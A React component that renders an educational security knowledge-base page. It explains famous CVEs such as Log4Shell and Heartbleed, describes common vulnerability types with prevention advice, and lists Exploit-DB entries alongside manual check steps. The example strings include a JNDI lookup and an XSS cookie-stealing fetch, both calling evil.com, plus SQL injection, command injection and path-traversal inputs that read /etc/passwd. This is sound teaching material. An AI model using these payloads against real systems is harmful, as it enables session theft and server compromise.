import { useState, useEffect } from "react";
import { Shield, ChevronDown, ChevronUp, ExternalLink, AlertTriangle, Zap, Lock, Code, Globe, Server, Database } from "lucide-react";
import Lottie from "lottie-react";
import "../../styles/learn.css";
import api from "../../api/axios";
import sqlIcon from "../../assets/icons/sql.json";
import wapatiIcon from "../../assets/icons/wapiti.json";
import sslIcon from "../../assets/icons/ssl.json";
import infoIcon from "../../assets/icons/info.json";
import nampIcon from "../../assets/icons/nmap.json";
import niktoIcon from "../../assets/icons/nikto.json";

// ... [Keep CVE_DATA and VULN_TYPES as they are] ...
const CVE_DATA = [
  {
    id: "CVE-2021-44228",
    name: "Log4Shell",
    category: "Remote Code Execution",
    severity: "Critical",
    score: "10.0",
    affected: "Apache Log4j 2.0-beta9 to 2.14.1",
    year: "2021",
    icon: "server",
    simple: "Log4j is a popular Java logging library. This bug allowed an attacker to type a special string (like `${jndi:ldap://evil.com/x}`) anywhere that gets logged — in usernames, search fields, HTTP headers — and the server would automatically download and run code from the attacker's computer. No login needed.",
    impact: "Full remote code execution. An attacker could take complete control of any vulnerable server. Affected millions of services including iCloud, Steam, Minecraft, and countless enterprise systems.",
    fix: "Upgrade to Log4j 2.15.0 or later. Disable JNDI lookups by setting `log4j2.formatMsgNoLookups=true`.",
    refs: "https://nvd.nist.gov/vuln/detail/CVE-2021-44228"
  },
  {
    id: "CVE-2017-0144",
    name: "EternalBlue / WannaCry",
    category: "Remote Code Execution",
    severity: "Critical",
    score: "9.8",
    affected: "Windows SMBv1 (XP, 7, Server 2003-2008)",
    year: "2017",
    icon: "globe",
    simple: "Windows computers share files over a protocol called SMB. There was a bug in the old version (SMBv1) where a malformed network packet could crash the system and let an attacker run their own code — without any login or user interaction. This was leaked from the NSA and used in the WannaCry ransomware attack.",
    impact: "Used by WannaCry ransomware which encrypted 230,000+ computers across 150 countries in 2017. Caused billions of dollars in damage including UK's NHS hospitals.",
    fix: "Apply Microsoft security patch MS17-010. Disable SMBv1 on all Windows systems.",
    refs: "https://nvd.nist.gov/vuln/detail/CVE-2017-0144"
  },
  {
    id: "CVE-2014-0160",
    name: "Heartbleed",
    category: "Information Disclosure",
    severity: "High",
    score: "7.5",
    affected: "OpenSSL 1.0.1 through 1.0.1f",
    year: "2014",
    icon: "lock",
    simple: "OpenSSL protects HTTPS websites. It has a 'heartbeat' feature to check if a connection is still alive. You send a message with a length — but there was no check that the actual message matched the claimed length. So attackers could say 'send me back 64KB' while only sending 1 byte, and the server would leak 64KB of its RAM — possibly containing passwords, session tokens, and private encryption keys.",
    impact: "Exposed private SSL keys, user credentials, and session cookies from millions of HTTPS servers worldwide. Affected Yahoo!, LastPass, Cloudflare, and many banks.",
    fix: "Upgrade to OpenSSL 1.0.1g or 1.0.2. Reissue all SSL certificates and force users to change passwords.",
    refs: "https://nvd.nist.gov/vuln/detail/CVE-2014-0160"
  },
  {
    id: "CVE-2021-26855",
    name: "ProxyLogon",
    category: "Authentication Bypass + RCE",
    severity: "Critical",
    score: "9.8",
    affected: "Microsoft Exchange Server 2013-2019",
    year: "2021",
    icon: "server",
    simple: "Microsoft Exchange is used by companies to handle email. This bug let attackers bypass authentication by forging a special HTTP header — tricking Exchange into thinking requests came from an internal trusted user. Combined with other bugs, attackers could upload and run web shells (backdoors) on the Exchange server without any credentials.",
    impact: "Exploited by Chinese APT group HAFNIUM to compromise 250,000+ Exchange servers worldwide before patches were available.",
    fix: "Apply the Microsoft emergency patches immediately. Scan IIS logs for suspicious X-AnonResource-Backend and X-BEResource headers.",
    refs: "https://nvd.nist.gov/vuln/detail/CVE-2021-26855"
  },
  {
    id: "CVE-2019-0708",
    name: "BlueKeep",
    category: "Remote Code Execution",
    severity: "Critical",
    score: "9.8",
    affected: "Windows XP, 7, Server 2003/2008 (RDP)",
    year: "2019",
    icon: "globe",
    simple: "Remote Desktop Protocol (RDP) lets people connect to Windows computers remotely. This bug allowed an attacker to send a specially crafted packet to port 3389 and gain full control of the machine — with no login required. Microsoft compared it to EternalBlue in potential for worm-like spreading.",
    impact: "Potentially wormable — could self-replicate across networks like WannaCry. Patched before widespread exploitation, but exploit code was later released publicly.",
    fix: "Apply Microsoft patch KB4499175. Disable RDP if not needed, or place it behind a VPN.",
    refs: "https://nvd.nist.gov/vuln/detail/CVE-2019-0708"
  },
  {
    id: "CVE-2017-5638",
    name: "Apache Struts (Equifax Breach)",
    category: "Remote Code Execution",
    severity: "Critical",
    score: "10.0",
    affected: "Apache Struts 2.3.5 - 2.3.31, 2.5 - 2.5.10",
    year: "2017",
    icon: "code",
    simple: "Apache Struts is a popular Java web framework. The Content-Type HTTP header was parsed in a way that allowed attackers to inject OGNL (Object-Graph Navigation Language) expressions. This meant any website built with Struts would execute arbitrary commands from the HTTP header — no account needed.",
    impact: "Used to breach Equifax, exposing the personal data (SSN, DOB, addresses) of 147 million Americans. One of the largest data breaches in history.",
    fix: "Upgrade to Struts 2.3.32 or 2.5.10.1+. Implement a WAF rule blocking malicious Content-Type headers.",
    refs: "https://nvd.nist.gov/vuln/detail/CVE-2017-5638"
  }
];

const VULN_TYPES = [
  {
    name: "SQL Injection (SQLi)",
    icon: "code",
    color: "#f87171",
    simple: "SQL Injection happens when an attacker inserts SQL code into an input field (like a login form). If the app doesn't properly sanitize input, the database runs the attacker's commands instead of the intended query.",
    example: `-- Normal login query:\nSELECT * FROM users WHERE username='alice' AND password='pass123';\n\n-- Attacker enters: ' OR '1'='1\nSELECT * FROM users WHERE username='' OR '1'='1' --' AND password='...';`,
    impact: "Data theft, authentication bypass, database deletion, full server compromise.",
    prevention: "Use parameterized queries / prepared statements. Never concatenate user input into SQL strings."
  },
  {
    name: "Cross-Site Scripting (XSS)",
    icon: "globe",
    color: "#fb923c",
    simple: "XSS allows attackers to inject malicious JavaScript into web pages viewed by other users. The victim's browser runs the script, which can steal cookies, redirect users, or perform actions on their behalf.",
    example: `<!-- Attacker posts this as a comment: -->\n<script>fetch('https://evil.com/steal?c='+document.cookie)</script>\n\n<!-- Every visitor who loads the page sends their cookies to the attacker -->`,
    impact: "Session hijacking, credential theft, phishing, defacement, malware distribution.",
    prevention: "Escape output in HTML context. Use Content Security Policy (CSP) headers. Validate and sanitize all user input."
  },
  {
    name: "Broken Authentication",
    icon: "lock",
    color: "#a855f7",
    simple: "Broken authentication means the login or session management system has weaknesses. This includes weak passwords, no rate limiting on login attempts, session tokens that don't expire, or tokens that can be guessed.",
    example: `// Session token that's just a number:\nGET /dashboard\nCookie: session=1042\n\n// Attacker tries session=1043, 1044... and hijacks other users' sessions`,
    impact: "Account takeover, privilege escalation, unauthorized access to sensitive data.",
    prevention: "Use secure, random session tokens. Implement MFA. Lock accounts after failed attempts. Set session expiration."
  },
  {
    name: "Command Injection",
    icon: "server",
    color: "#38bdf8",
    simple: "Command injection happens when user input is passed to a system shell command without sanitization. The attacker adds shell operators like \`;\`, \`&&\`, \`|\` to run their own commands on the server.",
    example: `# App runs: ping <user_input>\n# User enters: 8.8.8.8; cat /etc/passwd\n# Server runs: ping 8.8.8.8; cat /etc/passwd\n# Attacker sees the password file!`,
    impact: "Full server takeover, data exfiltration, ransomware deployment, lateral movement.",
    prevention: "Never pass user input to shell commands. Use language APIs with array arguments. Validate and whitelist input."
  },
  {
    name: "Insecure Direct Object Reference (IDOR)",
    icon: "zap",
    color: "#00ff88",
    simple: "IDOR occurs when an application uses user-controllable input to access objects directly without checking permissions. If you change an ID in a URL and get someone else's data, that's IDOR.",
    example: `# Your invoice URL:\nhttps://app.com/invoice/4521\n\n# You change it to:\nhttps://app.com/invoice/4520\n\n# And see another user's private invoice!`,
    impact: "Unauthorized access to other users' files, profiles, orders, messages, or any object.",
    prevention: "Always check that the currently authenticated user has permission to access the requested resource. Use indirect references."
  },
  {
    name: "Path Traversal",
    icon: "alert",
    color: "#fb923c",
    simple: "Path traversal lets attackers access files outside the intended directory by using \`../\` sequences in a filename parameter. If an app reads files based on user input without sanitization, attackers can read sensitive system files.",
    example: `# App loads profile picture:\nGET /image?file=profile.jpg\n\n# Attacker requests:\nGET /image?file=../../../../etc/passwd\n\n# Server reads and returns /etc/passwd!`,
    impact: "Source code disclosure, password exposure, config file leakage, potential RCE via log poisoning.",
    prevention: "Canonicalize file paths and validate they start with the expected base directory. Never pass raw user input to file reading functions."
  }
];

export default function Learn() {
  const [openCve, setOpenCve] = useState<string | null>(null);
  const [openVuln, setOpenVuln] = useState<string | null>(null);
  const [activeTab, setActiveTab] = useState<"cve" | "vulns" | "exploitdb">("vulns");
  const [exploits, setExploits] = useState<any[]>([]);
  const [loadingExploits, setLoadingExploits] = useState(false);
  const [exploitError, setExploitError] = useState<string | null>(null);

  const severityColor: Record<string, string> = {
    "Critical": "#f87171",
    "High": "#fb923c",
    "Medium": "#fbbf24",
    "Low": "#38bdf8"
  };

  const lottieIconMap: Record<string, any> = {
    sql: sqlIcon,
    wapiti: wapatiIcon,
    ssl: sslIcon,
    info: infoIcon,
    nmap: nampIcon,
    nikto: niktoIcon,
  };

  const getIcon = (name: string, size = 20) => {
    // Try lottie first
    if (lottieIconMap[name]) {
      return (
        <div style={{ width: size, height: size, minWidth: size, minHeight: size }}>
          <Lottie 
            animationData={lottieIconMap[name]} 
            loop 
            autoplay 
            style={{ width: '100%', height: '100%' }}
          />
        </div>
      );
    }
    
    switch (name) {
      case "server": return <Server size={size} />;
      case "globe": return <Globe size={size} />;
      case "lock": return <Lock size={size} />;
      case "code": return <Code size={size} />;
      case "zap": return <Zap size={size} />;
      case "alert": return <AlertTriangle size={size} />;
      default: return <Shield size={size} />;
    }
  };

  const getManualCheckSteps = (exploit: any) => {
    const title = String(exploit?.title || "").toLowerCase();
    const steps = [
      "Identify the exact product and version mentioned in the advisory.",
      "Compare your server/app version with the affected range.",
      "Review vendor guidance and apply the recommended patch or config change.",
      "Re-check headers, version banners, or public metadata to confirm the fix.",
    ];

    if (title.includes("wordpress") || title.includes("plugin")) {
      steps.unshift("Check your WordPress core and plugin versions in wp-admin > Updates.");
    }
    if (title.includes("apache") || title.includes("nginx")) {
      steps.unshift("Confirm your web server version via server headers or package manager.");
    }
    if (title.includes("sql")) {
      steps.unshift("Review database queries for unsafe string concatenation.");
    }

    return steps.slice(0, 5);
  };

  useEffect(() => {
    if (activeTab === "exploitdb" && exploits.length === 0 && !loadingExploits && !exploitError) {
      setLoadingExploits(true);
      api.get("/api/exploit/latest")
        .then((res) => {
          if (res.data && res.data.success) {
            setExploits(res.data.exploits || []);
          } else {
            setExploitError("Failed to load exploits.");
          }
        })
        .catch((err) => {
          setExploitError(err.response?.data?.error || "Error connecting to Exploit-DB feed.");
        })
        .finally(() => {
          setLoadingExploits(false);
        });
    }
  }, [activeTab, exploits.length, loadingExploits, exploitError]);

  return (
    <div className="learn-page">
      {/* Header */}
      <div className="learn-hero">
        <div className="learn-hero-icon"><Shield size={36} /></div>
        <h1>Security Knowledge Base</h1>
        <p>Learn about real-world vulnerabilities, how they work, their impact, and how to defend against them — explained in plain English.</p>
      </div>

      {/* Tabs */}
      <div className="learn-tabs">
        <button
          className={`learn-tab ${activeTab === "vulns" ? "active" : ""}`}
          onClick={() => setActiveTab("vulns")}
        >
          <Code size={16} /> Vulnerability Types
        </button>
        <button
          className={`learn-tab ${activeTab === "cve" ? "active" : ""}`}
          onClick={() => setActiveTab("cve")}
        >
          <AlertTriangle size={16} /> Real-World CVEs
        </button>
        <button
          className={`learn-tab ${activeTab === "exploitdb" ? "active" : ""}`}
          onClick={() => setActiveTab("exploitdb")}
        >
          <Database size={16} /> Exploit-DB (Latest)
        </button>
      </div>

      {/* Vulnerability Types */}
      {activeTab === "vulns" && (
        <div className="learn-grid">
          {VULN_TYPES.map((v) => (
            <div key={v.name} className="learn-card">
              <div className="learn-card-header" onClick={() => setOpenVuln(openVuln === v.name ? null : v.name)}>
                <div className="learn-card-title">
                  <span className="learn-icon" style={{ color: v.color }}>{getIcon(v.icon, 22)}</span>
                  <h3>{v.name}</h3>
                </div>
                {openVuln === v.name ? <ChevronUp size={18} /> : <ChevronDown size={18} />}
              </div>

              <p className="learn-summary">{v.simple}</p>

              {openVuln === v.name && (
                <div className="learn-expanded">
                  <div className="learn-section">
                    <h4>Example</h4>
                    <pre className="learn-code">{v.example}</pre>
                  </div>
                  <div className="learn-meta-row">
                    <div className="learn-section">
                      <h4>Impact</h4>
                      <p style={{ color: "#f87171" }}>{v.impact}</p>
                    </div>
                    <div className="learn-section">
                      <h4>Prevention</h4>
                      <p style={{ color: "#00ff88" }}>{v.prevention}</p>
                    </div>
                  </div>
                </div>
              )}
            </div>
          ))}
        </div>
      )}

      {/* Real CVEs */}
      {activeTab === "cve" && (
        <div className="cve-list">
          {CVE_DATA.map((cve) => (
            <div key={cve.id} className="cve-card">
              <div className="cve-header" onClick={() => setOpenCve(openCve === cve.id ? null : cve.id)}>
                <div className="cve-left">
                  <span className="cve-icon" style={{ color: severityColor[cve.severity] }}>{getIcon(cve.icon)}</span>
                  <div>
                    <div className="cve-id-row">
                      <span className="cve-id">{cve.id}</span>
                      <span className="cve-name">{cve.name}</span>
                    </div>
                    <div className="cve-meta">
                      <span className="cve-category">{cve.category}</span>
                      <span className="cve-year">{cve.year}</span>
                    </div>
                  </div>
                </div>
                <div className="cve-right">
                  <span className="cve-score" style={{ color: severityColor[cve.severity] }}>
                    CVSS {cve.score}
                  </span>
                  <span className="cve-sev-badge" style={{ background: severityColor[cve.severity] + "20", color: severityColor[cve.severity], border: `1px solid ${severityColor[cve.severity]}40` }}>
                    {cve.severity}
                  </span>
                  {openCve === cve.id ? <ChevronUp size={18} /> : <ChevronDown size={18} />}
                </div>
              </div>

              {openCve === cve.id && (
                <div className="cve-body">
                  <div className="cve-affected">
                    <span className="cve-label">Affected:</span> {cve.affected}
                  </div>

                  <div className="cve-section">
                    <h4>What happened? (Simple Explanation)</h4>
                    <p>{cve.simple}</p>
                  </div>

                  <div className="cve-section-row">
                    <div className="cve-section">
                      <h4 style={{ color: "#f87171" }}>Real-World Impact</h4>
                      <p>{cve.impact}</p>
                    </div>
                    <div className="cve-section">
                      <h4 style={{ color: "#00ff88" }}>How to Fix</h4>
                      <p>{cve.fix}</p>
                    </div>
                  </div>

                  <a href={cve.refs} target="_blank" rel="noreferrer" className="cve-ref-link">
                    <ExternalLink size={14} /> View on NVD
                  </a>
                </div>
              )}
            </div>
          ))}
        </div>
      )}

      {/* Exploit-DB Latest */}
      {activeTab === "exploitdb" && (
        <div className="cve-list">
          <div className="learn-callout">
            Showing the latest web-focused Exploit-DB entries with safe, manual validation steps.
          </div>
          {loadingExploits && <p style={{ color: "#8b949e", textAlign: "center", padding: "2rem" }}>Loading latest exploits...</p>}
          {exploitError && <p style={{ color: "#f87171", textAlign: "center", padding: "2rem" }}>{exploitError}</p>}
          {!loadingExploits && !exploitError && exploits.map((exploit, idx) => (
            <div key={idx} className="cve-card" style={{ padding: "1rem" }}>
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "0.5rem" }}>
                <h4 style={{ margin: 0, color: "#e6edf3", fontSize: "1rem" }}>{exploit.title}</h4>
                <span style={{ color: "#8b949e", fontSize: "0.8rem", whiteSpace: "nowrap", marginLeft: "1rem" }}>
                  {new Date(exploit.pubDate).toLocaleDateString()}
                </span>
              </div>
              {Array.isArray(exploit.cves) && exploit.cves.length > 0 && (
                <div className="exploit-tags">
                  {exploit.cves.map((cve: string) => (
                    <span key={cve} className="exploit-tag">{cve}</span>
                  ))}
                </div>
              )}
              <p style={{ color: "#8b949e", fontSize: "0.9rem", marginTop: 0, marginBottom: "1rem" }}>
                {exploit.description}
              </p>
              <div className="learn-section">
                <h4>Manual Check (Safe)</h4>
                <ul className="learn-checklist">
                  {getManualCheckSteps(exploit).map((step) => (
                    <li key={step}>{step}</li>
                  ))}
                </ul>
              </div>
              <a href={exploit.link} target="_blank" rel="noreferrer" className="cve-ref-link" style={{ display: "inline-flex", padding: "0.25rem 0.5rem", background: "#38bdf820", color: "#38bdf8", borderRadius: "4px", fontSize: "0.8rem", fontWeight: 600 }}>
                <ExternalLink size={14} /> View on Exploit-DB
              </a>
            </div>
          ))}
        </div>
      )}

      <div className="learn-footer">
        <Shield size={16} />
        <span>Educational purposes only. Always obtain authorization before testing any system.</span>
      </div>
    </div>
  );
}
